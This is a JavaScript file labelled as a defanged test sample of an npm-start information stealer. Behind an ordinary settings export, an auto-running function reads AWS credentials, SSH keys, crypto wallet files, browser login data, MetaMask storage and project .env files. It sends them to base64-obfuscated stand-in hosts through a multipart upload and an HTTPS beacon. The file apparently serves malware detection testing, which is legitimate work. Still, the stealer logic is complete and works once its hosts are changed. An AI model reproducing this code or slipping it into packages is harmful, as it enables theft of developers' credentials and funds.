// ============================================================================
// BURNER TEST SAMPLE — DEFANGED. Modelled on the "Contagious Interview"
// npm-start stealer (Elastic, Jul 2026). It only ever sends data to
// 203.0.113.55 (TEST-NET-3, unroutable) and *.example (reserved), so it can
// never reach a real server, even if run outside the sandbox.
// ============================================================================
const fs = require("fs"), os = require("os"), path = require("path"), http = require("http"), https = require("https");
const settings = { port: process.env.PORT || 3000, logLevel: "info" };

// "telemetry" endpoints, lightly hidden like the real samples
const _h = Buffer.from("MjAzLjAuMTEzLjU1", "base64").toString();          // 203.0.113.55
const _d = Buffer.from("Y2RuLXRlbGVtZXRyeS5leGFtcGxl", "base64").toString(); // cdn-telemetry.example

(function () {
  const H = os.homedir(), got = {};
  const grab = (p) => { try { got[p] = fs.readFileSync(path.join(H, p)); } catch (e) {} };
  [".aws/credentials", ".ssh/id_ed25519", ".config/solana/id.json", ".config/Exodus/exodus.wallet/seed.seco",
   ".config/google-chrome/Default/Login Data"].forEach(grab);
  try {
    const mm = ".config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn";
    fs.readdirSync(path.join(H, mm)).forEach((f) => grab(path.join(mm, f)));
  } catch (e) {}
  try { fs.readdirSync(path.join(H, "work")).forEach((d) => grab(path.join("work", d, ".env"))); } catch (e) {}

  // 1) multipart upload to a hard-coded IP on port 1224 (as BeaverTail does)
  const b = "----x" + Date.now(), parts = [];
  for (const [k, v] of Object.entries(got))
    parts.push(Buffer.from(`--${b}\r\nContent-Disposition: form-data; name="multi_file"; filename="${k.replace(/\//g, "_")}"\r\n\r\n`), v, Buffer.from("\r\n"));
  parts.push(Buffer.from(`--${b}--\r\n`));
  const body = Buffer.concat(parts);
  const r = http.request({ host: _h, port: 1224, path: "/uploads", method: "POST",
    headers: { "content-type": "multipart/form-data; boundary=" + b, "content-length": body.length } });
  r.on("error", () => {}); r.end(body);

  // 2) base64 JSON beacon over HTTPS
  const j = JSON.stringify({ h: os.hostname(), u: os.userInfo().username,
    d: Buffer.from(JSON.stringify(Object.fromEntries(Object.entries(got).map(([k, v]) => [k, v.toString("base64")])))).toString("base64") });
  const q = https.request({ host: _d, path: "/v1/collect", method: "POST", headers: { "content-type": "application/json" } });
  q.on("error", () => {}); q.end(j);
})();

module.exports = settings;
